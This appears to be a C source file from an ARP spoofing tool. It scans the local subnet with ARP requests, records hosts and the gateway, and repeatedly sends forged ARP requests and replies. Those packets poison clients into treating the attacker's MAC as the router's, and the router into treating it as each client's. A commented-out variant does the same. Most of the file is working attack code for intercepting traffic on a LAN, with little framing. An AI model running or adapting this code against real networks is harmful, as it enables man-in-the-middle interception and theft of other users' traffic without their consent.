#include "arp.h"
#include "../client.h"
#include <string.h>
#include <stdio.h>

extern unsigned char *src_ip;
extern unsigned char *router_ip;
extern unsigned char *src_mac;
extern unsigned char *netmask;

void AnalyzeArp(struct iovec *packet_ring, char **argv)
{
    struct ether_header     *eth;
    struct  ether_arp       *arptr;

    eth = (struct ether_header *)packet_ring->iov_base;

    switch(ntohs(eth -> ether_type))
    {
        case ETHERTYPE_ARP:
            arptr = (struct ether_arp *)((unsigned char *)eth+sizeof(*eth));
            ISlist_send(packet_ring); //send arp packet to any child
                                     //waiting
            //arp reply
            if ( ntohs(arptr -> ea_hdr.ar_op) == ARPOP_REPLY )
            {
                //pthread_mutex_lock(&cmutex);
                if (SearchClientMac(arptr -> arp_sha) == FALSE &&
                        memcmp(src_ip, arptr -> arp_spa, 4) != 0)
                {
                    if ( GetRouter() == NULL && memcmp(router_ip, arptr -> arp_spa, 4) == 0 )
                    {
                        AddRouter(arptr -> arp_sha, arptr -> arp_spa);
                        //ISlist_send(packet_ring);
                        //pthread_cond_signal(&cvar);
                    }
                    else
                    if ( memcmp(router_ip, arptr -> arp_spa, 4) != 0 )
                    {
                        AddClient(arptr -> arp_sha, arptr -> arp_spa);
                        //ISlist_send(packet_ring);
                       //pthread_cond_signal(&cvar);
                    }
                }
                //pthread_mutex_unlock(&cmutex);
            }
            PrintClients();
            PrintRouter();
            break;
        default:
            fprintf(stderr, "packet is not arp!!\n");
            break;
    }
}
void GeneralArpReply(struct iovec *packet, char **argv)
{
    struct ether_header   *ether;
    struct ether_arp      *arp_header;
    //struct client         *cl, *r;

    packet -> iov_len = sizeof(*ether)+sizeof(*arp_header);
    ISlist_recv(packet);
    ether = (struct ether_header *)packet -> iov_base;
    arp_header = (struct ether_arp *)packet+sizeof(*ether);

    //if i am sending the packet ignore it 
    if ( memcmp(ether -> ether_shost,  src_mac, 6) == 0 )//|| 
            //ether -> ether_type == ntohs(ETHERTYPE_ARP) ||
            //arp_header -> ea_hdr.ar_op == ntohs(ARPOP_REPLY) )
    {
        packet -> iov_len = 0;
        return;
    }
    
    //ethernet
    memcpy(ether -> ether_dhost, ether -> ether_shost, 6);
    memcpy(ether -> ether_shost, src_mac, 6);
    //arp
    arp_header -> ea_hdr.ar_op = htons(ARPOP_REPLY);
    memcpy(arp_header -> arp_tha, ether -> ether_dhost, 6);
    memcpy(arp_header -> arp_sha, src_mac, 6);
    memcpy(arp_header -> arp_tpa, arp_header -> arp_spa, 4);
    memcpy(arp_header -> arp_spa, src_ip, 4);

    usleep(9000);
}

void ClientArpPoisoning(struct iovec *packet, char **argv)
{
    struct ether_header *ether;
    struct ether_arp    *arp_header;
    struct client       *cl, *r;
    static int          i = 0;
    static int          req = 1;

    while (( cl = GetClient(0)) == NULL || ( r = GetRouter()) == NULL
            )
    {
        sleep(5);
    }

    if (( cl = GetClient(i)) == NULL )
    {
        sleep(1);
        i = 0;
        req = !req;
        packet -> iov_len = 0;
        return;
    }
    ether = (struct ether_header *)packet -> iov_base;
    memcpy(ether -> ether_shost, src_mac, 6);
    memcpy(ether -> ether_dhost, cl -> mac, 6);
    ether -> ether_type = htons(ETHERTYPE_ARP);
    
    arp_header = (struct ether_arp *)((unsigned char
                *)packet->iov_base+sizeof(*ether));
    memcpy(arp_header -> arp_sha, src_mac, 6);
    memcpy(arp_header -> arp_spa, r -> ip, 4);
    memcpy(arp_header -> arp_tpa, cl -> ip, 4);
    arp_header -> ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_header -> ea_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp_header -> ea_hdr.ar_hln = 6;
    arp_header -> ea_hdr.ar_pln = 4;

    
    if ( req )
    {
        memset((char *)arp_header -> arp_tha, '\0', 6);
        arp_header -> ea_hdr.ar_op = htons(ARPOP_REQUEST);
    }
    else
    {
    
        memcpy((char *)arp_header -> arp_tha, cl -> mac, 6);
        arp_header -> ea_hdr.ar_op = htons(ARPOP_REPLY);
    }
    i++;
    packet -> iov_len = sizeof(*ether)+sizeof(*arp_header);
    usleep(9000);

}

void RouterArpPoisoning(struct iovec *packet, char **argv)
{
    struct ether_header *ether;
    struct ether_arp    *arp_header;
    struct client       *cl, *r;
    static int          i = 0;
    static int          req = 1;

    while (( cl = GetClient(0)) == NULL || ( r = GetRouter()) == NULL
            )
    {
        sleep(5);
    }

    if (( cl = GetClient(i)) == NULL )
    {
        sleep(1);
        i = 0;
        packet -> iov_len = 0;
        req = !req;
        return;
    }
    ether = (struct ether_header *)packet->iov_base;
    memcpy(ether -> ether_shost, src_mac, 6);
    memcpy(ether -> ether_dhost, r -> mac, 6);
    ether -> ether_type = htons(ETHERTYPE_ARP);

    arp_header = (struct ether_arp *)((unsigned char
                *)packet->iov_base+sizeof(*ether));
    arp_header -> ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_header -> ea_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp_header -> ea_hdr.ar_hln = 6;
    arp_header -> ea_hdr.ar_pln = 4;
    memcpy(arp_header -> arp_sha, src_mac, 6);
    memcpy(arp_header -> arp_spa, cl -> ip, 4);
    memcpy(arp_header -> arp_tpa, r -> ip, 4);

    if ( req )
    {
        arp_header -> ea_hdr.ar_op = htons(ARPOP_REQUEST);
        memset((char *)arp_header -> arp_tha, '\0', 6);
    }
    else
    {
        arp_header -> ea_hdr.ar_op = htons(ARPOP_REPLY);
        memcpy(arp_header -> arp_tha, r -> mac, 6);
    }
    i++;
    packet -> iov_len = sizeof(*ether)+sizeof(*arp_header);
    usleep(9000);
}

/*
void ConstructArpReply(struct iovec *packet, char **argv)
{
    struct ether_header     *ether;
    struct ether_arp        *arp_header;
    struct client           *cl, *r, cltmp, rtmp;
    static int              i = 0;

    //pthread_mutex_lock(&cmutex);
    //router client doesnt exists wait until they appear
    while (( cl = GetClient(0)) == NULL || (r = GetRouter()) == NULL )
    {
        //pthread_cond_wait(&cvar, &cmutex);
    }
    //if no more clients time to poison the other side
    if (( cl = GetClient(i)) == NULL )
    {
        i = 0;
        poisonC = !poisonC;
        packet->iov_len = 0;
        pthread_mutex_unlock(&cmutex);
        return;
    }
    memcpy((char *)&cltmp, (char *)cl, sizeof(cltmp));
    memcpy((char *)&rtmp, (char *)r, sizeof(rtmp));
    pthread_mutex_unlock(&cmutex);
    //construct packet
    ether = (struct ether_header *)packet->iov_base;
    arp_header = (struct ether_arp *)((unsigned char *)packet->iov_base+sizeof(struct ether_header));
    memcpy((char *)ether->ether_shost, (char *)src_mac, 6);
    ether->ether_type = htons(ETHERTYPE_ARP);
    arp_header->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_header->ea_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp_header->ea_hdr.ar_hln = 6;
    arp_header->ea_hdr.ar_pln = 4;
    arp_header->ea_hdr.ar_op = htons(ARPOP_REPLY);
    memcpy((char *)arp_header->arp_sha, (char *)src_mac, 6);

    //poison client as router
    if (poisonC)
    {
        memcpy((char *)ether->ether_dhost, (char *)cltmp.mac, 6);
        memcpy((char *)arp_header->arp_spa, (char *)rtmp.ip, 4);
        memcpy((char *)arp_header->arp_tpa, (char *)cltmp.ip, 4);
        memcpy((char *)arp_header->arp_tha, (char *)cltmp.mac, 6);
    }
    //poison router as all clients
    else
    {
        memcpy((char *)ether->ether_dhost, (char *)rtmp.mac, 6);
        memcpy((char *)arp_header->arp_spa, (char *)cltmp.ip, 4);
        memcpy((char *)arp_header->arp_tpa, (char *)rtmp.ip, 4);
        memcpy((char *)arp_header->arp_tha, (char *)rtmp.mac, 6);
    }
    packet->iov_len = sizeof(struct ether_header)+sizeof(struct ether_arp);
    i++;
    //cyta works
    usleep(20000);
    return;
}
*/

void GeneralArpRequest(struct iovec *packet, char **argv)
{

    struct ether_header     *ether;
    struct ether_arp        *arp_header;
    static unsigned int     ipq = 1;
    unsigned int            ip;

    
    ip = (*(unsigned int *)netmask)&(*(unsigned int *)src_ip)|htonl(ipq);

    ether = (struct ether_header *)packet->iov_base;
    arp_header = (struct ether_arp *)((unsigned char *)
            packet->iov_base+sizeof(struct ether_header));
    memset((char *)ether->ether_dhost, 0xff, 6);
    memcpy((char *)ether->ether_shost, (char *)src_mac, 6);
    ether->ether_type = htons(ETHERTYPE_ARP);
    arp_header->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
    arp_header->ea_hdr.ar_pro = htons(ETHERTYPE_IP);
    arp_header->ea_hdr.ar_hln = 6;
    arp_header->ea_hdr.ar_pln = 4;
    arp_header->ea_hdr.ar_op = htons(ARPOP_REQUEST);
    memcpy((char *)arp_header->arp_sha, (char *)src_mac, 6);
    memcpy((char *)arp_header->arp_spa, (char *)src_ip, 4);
    //memcpy((char *)arp_header -> arp_spa, (char *)router_ip, 4);
    memcpy((char *)arp_header->arp_tpa, (char *)&ip, 4);
    memset((char *)arp_header->arp_tha, '\0', 6);
    packet->iov_len = sizeof(struct ether_header)+sizeof(struct ether_arp);
    ipq++;

    if (ipq > htonl(~*(unsigned int *)netmask))
    {
        sleep(60);
        ipq = 1;
    }
    //worked cyta
    //usleep(10000);
    usleep(20000);
}

